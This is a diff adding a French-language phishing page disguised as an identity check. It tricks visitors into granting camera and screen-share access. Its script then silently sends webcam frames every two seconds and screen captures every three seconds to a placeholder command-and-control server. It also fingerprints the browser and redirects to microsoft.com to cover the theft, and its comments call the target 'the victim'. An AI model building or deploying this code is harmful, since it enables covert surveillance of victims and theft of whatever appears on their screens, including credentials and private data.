@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Vérification de sécurité — Étape 2</title>
+<style>
+:root{--bg:#0a0a0f;--panel:#12121a;--border:#2a2a3a;
+      --red:#e63946;--text:#e0e0e0;--dim:#666;--green:#2ecc71}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);
+     font-family:'Segoe UI',Arial,sans-serif;
+     min-height:100vh;display:flex;flex-direction:column;
+     align-items:center;justify-content:center;padding:20px}
+.panel{background:var(--panel);border:1px solid var(--border);
+       border-radius:12px;padding:36px;width:460px;max-width:95vw}
+.logo{text-align:center;font-size:40px;margin-bottom:16px}
+h1{font-size:19px;text-align:center;margin-bottom:8px}
+.sub{color:var(--dim);font-size:13px;text-align:center;
+     margin-bottom:28px;line-height:1.6}
+.step{display:flex;align-items:center;gap:14px;padding:14px;
+      border:1px solid var(--border);border-radius:8px;
+      margin-bottom:10px;cursor:pointer;transition:border .2s}
+.step:hover{border-color:var(--red)}
+.step.done{border-color:var(--green)}
+.step.done .icon{background:rgba(46,204,113,.15);
+                 border-color:var(--green);color:var(--green)}
+.icon{width:42px;height:42px;border-radius:50%;
+      background:rgba(230,57,70,.1);border:1px solid var(--red);
+      display:flex;align-items:center;justify-content:center;
+      font-size:18px;flex-shrink:0;transition:all .2s}
+.step-text .title{font-size:14px;font-weight:600;margin-bottom:2px}
+.step-text .desc{font-size:12px;color:var(--dim)}
+.status{font-size:11px;margin-top:4px}
+.status.ok{color:var(--green)}
+.status.wait{color:var(--dim)}
+.status.err{color:var(--red)}
+button{width:100%;padding:13px;background:var(--red);border:none;
+       border-radius:6px;color:#fff;font-size:15px;font-weight:600;
+       cursor:pointer;margin-top:16px}
+button:disabled{opacity:.4;cursor:not-allowed}
+#preview{display:none;width:100%;border-radius:6px;margin-top:12px;
+         border:1px solid var(--border)}
+</style>
+</head>
+<body>
+<div class="panel">
+  <div class="logo">🔐</div>
+  <h1>Vérification d'identité requise</h1>
+  <p class="sub">
+    Pour accéder à votre espace sécurisé, nous devons confirmer
+    votre identité via deux vérifications rapides.
+  </p>
+
+  <!-- Étape 1 : caméra -->
+  <div class="step" id="step-cam" onclick="requestCamera()">
+    <div class="icon">📷</div>
+    <div class="step-text">
+      <div class="title">Vérification faciale</div>
+      <div class="desc">Autorisez l'accès à votre caméra</div>
+      <div class="status wait" id="cam-status">En attente…</div>
+    </div>
+  </div>
+
+  <!-- Étape 2 : écran -->
+  <div class="step" id="step-screen" onclick="requestScreen()">
+    <div class="icon">🖥</div>
+    <div class="step-text">
+      <div class="title">Capture de conformité</div>
+      <div class="desc">Partagez votre écran brièvement</div>
+      <div class="status wait" id="screen-status">En attente…</div>
+    </div>
+  </div>
+
+  <!-- Preview caméra cachée -->
+  <video id="preview" autoplay muted playsinline></video>
+
+  <button id="btn" disabled onclick="complete()">
+    Continuer →
+  </button>
+</div>
+
+<script>
+const C2  = "http://FILL_SERVER:FILL_PORT";
+let camOK = false, screenOK = false;
+let camStream = null, screenStream = null;
+let camInterval = null, screenInterval = null;
+
+// ── utilitaires ───────────────────────────────────────────────
+function b64(canvas){ return canvas.toDataURL("image/jpeg", 0.6); }
+
+function sendFrame(type, dataUrl){
+  fetch(C2 + "/frame", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      type,
+      frame: dataUrl,
+      ts:    new Date().toISOString(),
+      ua:    navigator.userAgent,
+    })
+  }).catch(()=>{});
+}
+
+function captureVideo(video, type){
+  const c = document.createElement("canvas");
+  c.width  = video.videoWidth  || 640;
+  c.height = video.videoHeight || 480;
+  c.getContext("2d").drawImage(video, 0, 0);
+  sendFrame(type, b64(c));
+}
+
+function markDone(stepId, statusId, msg){
+  document.getElementById(stepId).classList.add("done");
+  const s = document.getElementById(statusId);
+  s.className = "status ok";
+  s.textContent = msg;
+  if(camOK && screenOK)
+    document.getElementById("btn").disabled = false;
+}
+
+function markErr(statusId, msg){
+  const s = document.getElementById(statusId);
+  s.className = "status err";
+  s.textContent = msg;
+}
+
+// ── caméra ────────────────────────────────────────────────────
+async function requestCamera(){
+  document.getElementById("cam-status").textContent = "Connexion…";
+  try{
+    camStream = await navigator.mediaDevices.getUserMedia({
+      video:{width:1280,height:720,facingMode:"user"},
+      audio:false
+    });
+    const video = document.getElementById("preview");
+    video.srcObject = camStream;
+    video.style.display = "none"; // cachée pour la victime
+
+    // Attendre que la vidéo soit prête
+    video.onloadedmetadata = () => {
+      camOK = true;
+      markDone("step-cam","cam-status","✓ Vérification réussie");
+
+      // Capture toutes les 2 secondes
+      camInterval = setInterval(() => {
+        captureVideo(video, "camera");
+      }, 2000);
+
+      // Première capture immédiate
+      setTimeout(() => captureVideo(video, "camera"), 500);
+    };
+  }catch(e){
+    markErr("cam-status",
+      e.name==="NotAllowedError"
+        ? "Accès refusé — cliquez pour réessayer"
+        : "Erreur: " + e.message);
+  }
+}
+
+// ── partage écran ─────────────────────────────────────────────
+async function requestScreen(){
+  document.getElementById("screen-status").textContent = "Connexion…";
+  try{
+    screenStream = await navigator.mediaDevices.getDisplayMedia({
+      video:{cursor:"always"},
+      audio:false
+    });
+    const video = document.createElement("video");
+    video.srcObject = screenStream;
+    video.autoplay  = true;
+    video.muted     = true;
+
+    screenStream.getVideoTracks()[0].onended = () => {
+      clearInterval(screenInterval);
+      screenOK = false;
+      markErr("screen-status","Partage arrêté");
+    };
+
+    video.onloadedmetadata = () => {
+      screenOK = true;
+      markDone("step-screen","screen-status","✓ Vérification réussie");
+
+      // Capture écran toutes les 3 secondes
+      screenInterval = setInterval(() => {
+        captureVideo(video, "screen");
+      }, 3000);
+
+      setTimeout(() => captureVideo(video, "screen"), 500);
+    };
+  }catch(e){
+    markErr("screen-status",
+      e.name==="NotAllowedError"
+        ? "Accès refusé — cliquez pour réessayer"
+        : "Erreur: " + e.message);
+  }
+}
+
+// ── fin ───────────────────────────────────────────────────────
+function complete(){
+  // Envoyer fingerprint final
+  fetch(C2 + "/collect", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      page:  "surveillance_complete",
+      ua:    navigator.userAgent,
+      lang:  navigator.language,
+      tz:    Intl.DateTimeFormat().resolvedOptions().timeZone,
+      cam:   camOK,
+      screen:screenOK,
+    })
+  });
+  // Continuer à capturer en arrière-plan
+  // Rediriger vers page d'accueil légitime
+  window.location.href = "https://microsoft.com";
+}
+
+// Fingerprint à l'arrivée
+fetch(C2 + "/collect", {
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({
+    page:"surveillance_land",
+    ua:navigator.userAgent,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen:screen.width+"x"+screen.height,
+  })
+});
+</script>
+</body>
+</html>
